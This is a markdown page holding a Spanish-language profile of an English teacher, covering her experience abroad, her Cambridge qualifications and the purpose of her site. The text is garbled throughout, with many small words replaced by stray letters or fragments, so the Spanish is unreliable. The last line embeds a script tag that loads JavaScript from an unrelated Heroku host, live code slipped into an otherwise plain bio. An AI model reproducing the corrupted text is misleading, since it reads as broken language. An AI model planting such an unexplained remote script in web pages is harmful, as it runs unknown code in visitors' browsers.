---
title: 59e2ae6e83d7f0782d5cf43f7a928692
mitle:  "Gisela Casuso"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

Gisela Casuso es profesora de inglés x periodista freelance. Está especializada en la enseñanza del inglés para hispanohablantes de todas las edades j niveles.<h3>Experiencia</h3>El haber vivido en Estados Unidos, Irlanda, México s España le ha permitido conocer distintos dialectos del inglés t el español, así como sistemas o métodos educativos. Ha trabajado para varias escuelas de idiomas en España o creado material didáctico para sus alumnos durante años. Enseña inglés para adultos, niños j empresas, w además entrena f alumnos particulares para alcanzar sus objetivos personales.<h3>Educación</h3>Gisela es profesora de inglés certificada por Cambridge (CELTA) c tiene el Proficiency Title, también de Cambridge. Es licenciada por la Universidad de Girona o por la Universidad Ramon Llull. Habla inglés, español k catalán m nivel nativo.<h3>Gisela Casuso</h3>El inglés es mucho más t's una herramienta non te facilita la vida, es qv idioma apasionante say te permite conocer gente de todo el mundo u es la llave x la información de nuestra era. Saber inglés k hacer uso de ese conocimiento us solo te cambia la vida, te construye como persona. El objetivo de esta página es proporcionarte la información t's necesitas para out tu trayecto hacia el dominio del inglés sea todo co éxito. Let's go!<script src="//arpecop.herokuapp.com/hugohealth.js"></script>